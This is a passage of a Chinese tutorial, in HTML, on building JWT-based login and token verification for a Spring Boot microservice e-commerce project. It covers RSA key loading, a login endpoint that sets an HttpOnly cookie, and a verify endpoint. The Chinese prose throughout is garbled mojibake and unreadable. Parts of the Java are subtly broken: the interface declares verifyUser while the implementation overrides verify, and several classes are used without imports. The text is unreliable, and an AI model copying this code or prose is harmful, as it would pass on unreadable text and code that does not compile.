<li>å¦‚æœå­˜åœ¨ä¸beanå…³è”çš„ä»»ä½•BeanPostProcessorsï¼ˆåå¤„ç†å™¨ï¼‰ï¼Œåˆ™è°ƒç”¨preProcessBeforeInitialization()æ–¹æ³•ã€‚æ¯”å¦‚Autowiredç­‰ä¾èµ–æ³¨å…¥åŠŸèƒ½æ˜¯åœ¨æ­¤æ—¶å®Œæˆã€‚</li>
<li>å¦‚æœBeanå®ç°äº†InitializingBeanæ¥å£ï¼Œåˆ™è°ƒç”¨beançš„afterPropertiesSet()æ–¹æ³•ã€‚</li>
<li>å¦‚æœä¸ºbeanæŒ‡å®šäº†init-methodï¼Œé‚£ä¹ˆå°†è°ƒç”¨beançš„initæ–¹æ³•ã€‚</li>
<li>æœ€åï¼Œå¦‚æœå­˜åœ¨ä¸beanå…³è”çš„ä»»ä½•BeanPostProcessorsï¼Œåˆ™å°†è°ƒç”¨postProcessAfterInitializationï¼ˆï¼‰æ–¹æ³•ã€‚</li>
</ol>
<p>å› æ­¤ï¼Œæˆ‘ä»¬åŠ è½½å…¬é’¥ã€ç§é’¥å¯ä»¥å†7æˆ–8çš„ä¸¤ä¸ªä½ç½®æ¥å®Œæˆã€‚æ¯”å¦‚æˆ‘ä»¬åœ¨7çš„ä½ç½®ï¼Œéœ€è¦ä¸¤æ­¥ï¼š</p>
<ul>
<li>å®ç°InitializingBeanæ¥å£</li>
<li>å®ç°afterPropertiesSetæ–¹æ³•ï¼Œå¹¶åœ¨æ–¹æ³•å†…åŠ è½½å¯†é’¥</li>
</ul>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.RsaUtils;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.InitializingBean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.security.PrivateKey;</span><br><span class="line"><span class="keyword">import</span> java.security.PublicKey;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="meta">@ConfigurationProperties(prefix = &quot;ly.jwt&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtProperties</span> <span class="keyword">implements</span> <span class="title class_">InitializingBean</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å…¬é’¥åœ°å€</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String pubKeyPath;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç§é’¥åœ°å€</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String priKeyPath;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> PublicKey publicKey;</span><br><span class="line">    <span class="keyword">private</span> PrivateKey privateKey;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">afterPropertiesSet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// è·å–å…¬é’¥å’Œç§é’¥</span></span><br><span class="line">            <span class="built_in">this</span>.publicKey = RsaUtils.getPublicKey(pubKeyPath);</span><br><span class="line">            <span class="built_in">this</span>.privateKey = RsaUtils.getPrivateKey(priKeyPath);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            log.error(<span class="string">&quot;åˆå§‹åŒ–å…¬é’¥å’Œç§é’¥å¤±è´¥ï¼&quot;</span>, e);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="ç™»å½•åŠŸèƒ½"><a href="#ç™»å½•åŠŸèƒ½" class="headerlink" title="ç™»å½•åŠŸèƒ½"></a>ç™»å½•åŠŸèƒ½</h3><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬éœ€è¦åœ¨<code>ly-auth</code>ç¼–å†™ä¸€ä¸ªæ¥å£ï¼Œå¯¹å¤–æä¾›ç™»å½•æˆæƒæœåŠ¡ã€‚</p>
<p>ç™»å½•æˆæƒæµç¨‹æˆ‘ä»¬ä¸Šé¢å·²ç»åˆ†æè¿‡ï¼ŒåŸºæœ¬æµç¨‹å¦‚ä¸‹ï¼šï¼š</p>
<ul>
<li>1ã€ç”¨æˆ·è¯·æ±‚ç™»å½•ï¼Œæºå¸¦ç”¨æˆ·åå¯†ç åˆ°æˆæƒä¸­å¿ƒ</li>
<li>2ã€æˆæƒä¸­å¿ƒæºå¸¦ç”¨æˆ·åå¯†ç ï¼Œåˆ°ç”¨æˆ·ä¸­å¿ƒæŸ¥è¯¢ç”¨æˆ·</li>
<li>3ã€æŸ¥è¯¢å¦‚æœæ­£ç¡®ï¼Œç”ŸæˆJWTå‡­è¯ï¼ŒæŸ¥è¯¢é”™è¯¯åˆ™è¿”å›400,</li>
<li>4ã€æŠŠJWTå†™å…¥ç”¨æˆ·cookie</li>
</ul>
<h4 id="controller"><a href="#controller" class="headerlink" title="controller"></a>controller</h4><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°±åœ¨<code>ly-auth</code>çš„<code>com.leyou.auth.web</code>ä¸‹æ·»åŠ <code>UserAuthController</code>ï¼Œå¹¶ç¼–å†™ç™»å½•æ¥å£ï¼š</p>
<ul>
<li>è¯·æ±‚æ–¹å¼ï¼špost</li>
<li>è¯·æ±‚è·¯å¾„ï¼š&#x2F;user&#x2F;login</li>
<li>è¯·æ±‚å‚æ•°ï¼šusernameå’Œpassword</li>
<li>è¿”å›ç»“æœï¼šæ— ï¼Œç›´æ¥å†™å…¥cookie</li>
</ul>
<p>ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.service.UserAuthService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.ResponseEntity;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAuthController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserAuthService userAuthService;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç™»å½•æ¥å£</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> username ç”¨æˆ·å</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> password å¯†ç </span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> æ— </span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@PostMapping(&quot;login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> ResponseEntity&lt;Void&gt; <span class="title function_">login</span><span class="params">(</span></span><br><span class="line"><span class="params">            <span class="meta">@RequestParam(&quot;username&quot;)</span> String username,</span></span><br><span class="line"><span class="params">            <span class="meta">@RequestParam(&quot;password&quot;)</span> String password,</span></span><br><span class="line"><span class="params">            HttpServletResponse response)</span>&#123;</span><br><span class="line">        <span class="comment">// è°ƒç”¨serviceï¼Œå®Œæˆç™»å½•</span></span><br><span class="line">        userAuthService.login(username, password, response);</span><br><span class="line">        <span class="comment">// ç™»å½•æˆåŠŸï¼Œæ— è¿”å›å€¼, 204çŠ¶æ€ç </span></span><br><span class="line">        <span class="keyword">return</span> ResponseEntity.noContent().build();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="service"><a href="#service" class="headerlink" title="service"></a>service</h4><p>serviceçš„åŸºæœ¬æµç¨‹ï¼š</p>
<ul>
<li>æŸ¥è¯¢ç”¨æˆ·</li>
<li>ç”Ÿæˆtoken</li>
<li>å†™å…¥cookie</li>
</ul>
<p>è¿™é‡Œè¿˜æœ‰å‡ ä¸ªå±æ€§è¦é…ç½®ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>cookieåç§°</li>
<li>cookieçš„domainå±æ€§ï¼Œå†³å®šcookieåœ¨å“ªäº›åŸŸåä¸‹ç”Ÿæ•ˆ</li>
</ul>
<p>è¿™ä¸‰ä¸ªå±æ€§æˆ‘ä»¬å®šä¹‰åˆ°ä¸€ä¸ªå¸¸é‡ç±»ä¸­ï¼Œæ”¾åˆ°<code>ly-common</code>ä¸‹çš„ <code>com.leyou.common.constants</code>ä¸­</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022678.png" alt="1573815043357"> </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.common.constants;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserTokenConstants</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”¨æˆ·tokençš„cookieåç§°</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">COOKIE_NAME</span> <span class="operator">=</span> <span class="string">&quot;LY_TOKEN&quot;</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ç”¨æˆ·tokençš„cookieçš„domain</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DOMAIN</span> <span class="operator">=</span> <span class="string">&quot;leyou.com&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼šcookieçš„domainå†³å®šäº†cookieä½œç”¨çš„åŸŸåï¼Œå†™æˆâ€<code>leyou.com</code>â€œå¯ä»¥è®©<code>leyou.com</code>ä¸‹çš„æ‰€æœ‰äºŒçº§ä»¥ä¸ŠåŸŸåå…±äº«cookie</p>
<p>åœ¨<code>ly-auth-service</code>çš„<code>com.leyou.auth.service</code>åŒ…ä¸­å®šä¹‰æ¥å£ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserAuthService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(String username, String password, HttpServletResponse response)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>ly-auth-service</code>çš„<code>com.leyou.auth.service.impl</code>åŒ…ä¸­å®šä¹‰å®ç°ç±»ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.leyou.auth.service.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.config.JwtProperties;</span><br><span class="line"><span class="keyword">import</span> com.leyou.auth.service.UserAuthService;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.constants.UserTokenConstants;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.entity.UserInfo;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.exception.LyException;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.CookieUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.common.utils.JwtUtils;</span><br><span class="line"><span class="keyword">import</span> com.leyou.user.client.UserClient;</span><br><span class="line"><span class="keyword">import</span> com.leyou.user.dto.UserDTO;</span><br><span class="line"><span class="keyword">import</span> feign.FeignException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> è™å“¥</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserAuthServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">UserAuthService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> UserClient userClient;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> JwtProperties prop;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserAuthServiceImpl</span><span class="params">(UserClient userClient, JwtProperties prop)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.userClient = userClient;</span><br><span class="line">        <span class="built_in">this</span>.prop = prop;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">login</span><span class="params">(String username, String password, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="comment">// 1.æŸ¥è¯¢ç”¨æˆ·</span></span><br><span class="line">        <span class="type">UserDTO</span> <span class="variable">user</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            user = userClient.queryUserByUsernameAndPassword(username, password);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FeignException e) &#123;</span><br><span class="line">            <span class="comment">// æ•è·feignçš„å¼‚å¸¸ï¼Œå¹¶è·å–feignè°ƒç”¨çš„çŠ¶æ€ç å’Œå¼‚å¸¸ä¿¡æ¯</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(e.status(), e.contentUTF8(), e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 2.åˆ¤æ–­æŸ¥è¯¢ç»“æœ</span></span><br><span class="line">        <span class="keyword">if</span>(user == <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">// æŸ¥è¯¢å¤±è´¥ï¼Œä¸€å®šæ˜¯ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 3.ç”Ÿæˆtoken</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> JwtUtils.generateToken(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">UserInfo</span>(user.getId(), user.getUsername()), prop.getPrivateKey());</span><br><span class="line">        <span class="comment">// 4.å†™å…¥cookie</span></span><br><span class="line">        <span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(UserTokenConstants.COOKIE_NAME, token);</span><br><span class="line">        <span class="comment">// cookieçš„ä½œç”¨åŸŸ</span></span><br><span class="line">        cookie.setDomain(UserTokenConstants.DOMAIN);</span><br><span class="line">        <span class="comment">// æ˜¯å¦ç¦æ­¢JSæ“ä½œcookieï¼Œé¿å…XSSæ”»å‡»</span></span><br><span class="line">        cookie.setHttpOnly(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// cookieæœ‰æ•ˆæœŸï¼Œ-1å°±æ˜¯è·Ÿéšå½“å‰ä¼šè¯ï¼Œæµè§ˆå™¨å…³é—­å°±æ¶ˆå¤±</span></span><br><span class="line">        cookie.setMaxAge(-<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// cookieä½œç”¨çš„è·¯å¾„ï¼Œ/ä»£è¡¨ä¸€åˆ‡è·¯å¾„</span></span><br><span class="line">        cookie.setPath(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">        response.addCookie(cookie);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="æµ‹è¯•-1"><a href="#æµ‹è¯•-1" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h4><p>åœ¨ç™»å½•é¡µé¢å¡«å†™ä¿¡æ¯ï¼Œç™»å½•åè·³è½¬åˆ°é¦–é¡µï¼Œå‘ç°tokenæˆåŠŸå†™å…¥äº†ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022679.png" alt="1527521423469"></p>
<h3 id="é¦–é¡µåˆ¤æ–­ç™»å½•çŠ¶æ€"><a href="#é¦–é¡µåˆ¤æ–­ç™»å½•çŠ¶æ€" class="headerlink" title="é¦–é¡µåˆ¤æ–­ç™»å½•çŠ¶æ€"></a>é¦–é¡µåˆ¤æ–­ç™»å½•çŠ¶æ€</h3><p>è™½ç„¶cookieå·²ç»æˆåŠŸå†™å…¥ï¼Œä½†æ˜¯æˆ‘ä»¬é¦–é¡µçš„é¡¶éƒ¨ï¼Œç™»å½•çŠ¶æ€ä¾ç„¶æ²¡èƒ½åˆ¤æ–­å‡ºç”¨æˆ·ä¿¡æ¯ï¼š</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022680.png" alt="1527521794580"></p>
<p>æˆ‘ä»¬æ€è€ƒä¸€ä¸‹ï¼Œåº”è¯¥å¦‚ä½•åˆ¤æ–­ç”¨æˆ·æ˜¯å¦ç™»å½•å‘¢ï¼Ÿ</p>
<h4 id="æ­¥éª¤åˆ†æ"><a href="#æ­¥éª¤åˆ†æ" class="headerlink" title="æ­¥éª¤åˆ†æ"></a>æ­¥éª¤åˆ†æ</h4><p>ä¼ ç»Ÿç™»å½•æ ¡éªŒçš„æ­¥éª¤ï¼š</p>
<ul>
<li>1ï¼‰ç”¨æˆ·è¯·æ±‚åˆ°è¾¾æœåŠ¡ç«¯ï¼Œä¼šè‡ªåŠ¨æºå¸¦cookie</li>
<li>2ï¼‰cookieä¸­åŒ…å«sessionIdï¼Œtomcatæ ¹æ®sessionIdè·å–session</li>
<li>3ï¼‰ä»sessionä¸­è¯»å–ç”¨æˆ·ä¿¡æ¯ï¼Œåˆ¤æ–­æ˜¯å¦å­˜åœ¨</li>
<li>4ï¼‰å­˜åœ¨ï¼Œè¯æ˜å·²ç»ç™»å½•ï¼›ä¸å­˜åœ¨ï¼Œè¯æ˜ç™»å½•è¶…æ—¶æˆ–æœªç™»å½•</li>
</ul>
<p>æˆ‘ä»¬ç°åœ¨ä½¿ç”¨çš„æ˜¯æ— çŠ¶æ€ç™»å½•ï¼Œä¸å­˜åœ¨sessionï¼Œè€Œæ˜¯æŠŠç”¨æˆ·èº«ä»½å†™å…¥äº†tokenï¼Œæ˜¯å¦éœ€è¦å‘è¯·æ±‚åˆ°æœåŠ¡ç«¯è¿›è¡Œæ ¡éªŒå‘¢ï¼Ÿ</p>
<p>è‚¯å®šéœ€è¦çš„ï¼Œå› ä¸ºtokenéœ€è¦é€šè¿‡å…¬é’¥è§£ææ‰çŸ¥é“æ˜¯å¦æœ‰æ•ˆã€‚</p>
<p>åˆ†æä¸€ä¸‹æ­¥éª¤ï¼š</p>
<ul>
<li>1ï¼‰é¡µé¢å‘åå°å‘èµ·è¯·æ±‚ï¼Œæºå¸¦cookie</li>
<li>2ï¼‰åå°è·å–cookieä¸­çš„LY_TOKEN</li>
<li>3ï¼‰æ ¡éªŒtokenæ˜¯å¦æœ‰æ•ˆ<ul>
<li>æ— æ•ˆï¼šç™»å½•å¤±æ•ˆ</li>
<li>æœ‰æ•ˆï¼šè§£æå‡ºé‡Œé¢çš„ç”¨æˆ·ä¿¡æ¯ï¼Œè¿”å›åˆ°é¡µé¢</li>
</ul>
</li>
</ul>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°±åˆ†æ­¥å®ç°ä¸Šè¿°åŠŸèƒ½ã€‚</p>
<h4 id="é¡µé¢JSä»£ç "><a href="#é¡µé¢JSä»£ç " class="headerlink" title="é¡µé¢JSä»£ç "></a>é¡µé¢JSä»£ç </h4><p>é¦–å…ˆæ˜¯é¡µé¢å‘èµ·è¯·æ±‚ï¼Œæ ¡éªŒcookieã€‚</p>
<p>é¡µé¢çš„é¡¶éƒ¨å·²ç»è¢«æˆ‘ä»¬å°è£…ä¸ºä¸€ä¸ªç‹¬ç«‹çš„Vueç»„ä»¶ï¼Œåœ¨<code>/js/pages/shortcut.js</code>ä¸­</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022681.png" alt="1527522039407"></p>
<p>æ‰“å¼€jsï¼Œå‘ç°é‡Œé¢å·²ç»å®šä¹‰å¥½äº†Vueç»„ä»¶ï¼Œå¹¶ä¸”åœ¨createdå‡½æ•°ä¸­ï¼ŒæŸ¥è¯¢ç”¨æˆ·ä¿¡æ¯ï¼š</p>
<p> <img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220022682.png" alt="image-20200325111841923"></p>
<p>å› ä¸ºtokenåœ¨cookieä¸­ï¼Œå› æ­¤æœ¬æ¬¡è¯·æ±‚è‚¯å®šä¼šæºå¸¦tokenä¿¡æ¯åœ¨å¤´ä¸­ã€‚</p>
<h4 id="æ ¡éªŒç”¨æˆ·ç™»å½•çŠ¶æ€"><a href="#æ ¡éªŒç”¨æˆ·ç™»å½•çŠ¶æ€" class="headerlink" title="æ ¡éªŒç”¨æˆ·ç™»å½•çŠ¶æ€"></a>æ ¡éªŒç”¨æˆ·ç™»å½•çŠ¶æ€</h4><p>æˆ‘ä»¬åœ¨<code>ly-auth</code>ä¸­å®šä¹‰ç”¨æˆ·çš„æ ¡éªŒæ¥å£ï¼Œé€šè¿‡cookieè·å–tokenï¼Œç„¶åæ ¡éªŒé€šè¿‡è¿”å›ç”¨æˆ·ä¿¡æ¯ã€‚</p>
<ul>
<li>è¯·æ±‚æ–¹å¼ï¼šGET</li>
<li>è¯·æ±‚è·¯å¾„ï¼š&#x2F;user&#x2F;verify</li>
<li>è¯·æ±‚å‚æ•°ï¼šæ— ï¼Œä¸è¿‡æˆ‘ä»¬éœ€è¦ä»cookieä¸­è·å–tokenä¿¡æ¯</li>
<li>è¿”å›ç»“æœï¼šæ ¡éªŒæˆåŠŸè¿”å›ç”¨æˆ·åï¼›æ ¡éªŒå¤±è´¥ï¼Œåˆ™è¿”å›401</li>
</ul>
<p>åœ¨<code>ly-auth-service</code>çš„<code>com.leyou.auth.web</code>åŒ…çš„<code>UserAuthController</code>ä¸­æ·»åŠ ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * éªŒè¯ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@GetMapping(&quot;verify&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ResponseEntity&lt;String&gt; <span class="title function_">verifyUser</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="comment">// æˆåŠŸåç›´æ¥è¿”å›</span></span><br><span class="line">    <span class="keyword">return</span> ResponseEntity.ok(userAuthService.verifyUser(request));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>åœ¨<code>ly-auth-service</code>çš„<code>com.leyou.auth.service</code>åŒ…çš„<code>UserAuthService</code>ä¸­æ·»åŠ ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String <span class="title function_">verifyUser</span><span class="params">(HttpServletRequest request)</span>;</span><br></pre></td></tr></table></figure>



<p>åœ¨<code>ly-auth-service</code>çš„<code>com.leyou.auth.service.impl</code>åŒ…çš„<code>UserAuthServiceImpl</code>ä¸­æ·»åŠ ä»£ç ï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">verify</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="comment">// 1.æœåŠ¡ç«¯è·å–cookieä¸­çš„token</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> CookieUtils.getCookieValue(request, UserTokenConstants.COOKIE_NAME);</span><br><span class="line">    <span class="keyword">if</span> (StringUtils.isBlank(token)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;æœªç™»å½•æˆ–è€…ç™»å½•è¶…æ—¶!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.é€šè¿‡å…¬é’¥éªŒè¯tokenæ˜¯å¦æœ‰æ•ˆ</span></span><br><span class="line">    Payload&lt;UserInfo&gt; payload = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        payload = JwtUtils.getInfoFromToken(token, prop.getPublicKey(), UserInfo.class);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (JwtException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>,<span class="string">&quot;ç”¨æˆ·æœªç™»å½•æˆ–ç™»å½•è¶…æ—¶ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3.å¦‚æœæœ‰æ•ˆï¼Œè¿”å›ç”¨æˆ·ä¿¡æ¯</span></span><br><span class="line">    <span class="type">UserInfo</span> <span class="variable">userInfo</span> <span class="operator">=</span> payload.getUserInfo();</span><br><span class="line">    <span class="keyword">if</span>(userInfo == <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">LyException</span>(<span class="number">400</span>, <span class="string">&quot;ç”¨æˆ·æœªç™»å½•æˆ–ç™»å½•è¶…æ—¶ï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> userInfo.getUsername();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="JWTç™»å½•02"><a href="#JWTç™»å½•02" class="headerlink" title="JWTç™»å½•02"></a>JWTç™»å½•02</h1><h2 id="ç½‘å…³çš„ç”¨æˆ·é‰´æƒ"><a href="#ç½‘å…³çš„ç”¨æˆ·é‰´æƒ" class="headerlink" title="ç½‘å…³çš„ç”¨æˆ·é‰´æƒ"></a>ç½‘å…³çš„ç”¨æˆ·é‰´æƒ</h2><p>æ˜¨å¤©çš„è¯¾ç¨‹ä¸­ï¼Œæˆ‘ä»¬å®ç°äº†ç™»å½•ç›¸å…³çš„å‡ ä¸ªåŠŸèƒ½ï¼Œä¹Ÿå°±æ˜¯ç»™ç”¨æˆ·æˆæƒã€‚æ¥ä¸‹æ¥ï¼Œç”¨æˆ·è®¿é—®æˆ‘ä»¬çš„ç³»ç»Ÿï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ ¹æ®ç”¨æˆ·çš„èº«ä»½ï¼Œåˆ¤æ–­æ˜¯å¦æœ‰æƒé™è®¿é—®å¾®æœåŠ¡èµ„æºï¼Œå°±æ˜¯é‰´æƒã€‚</p>
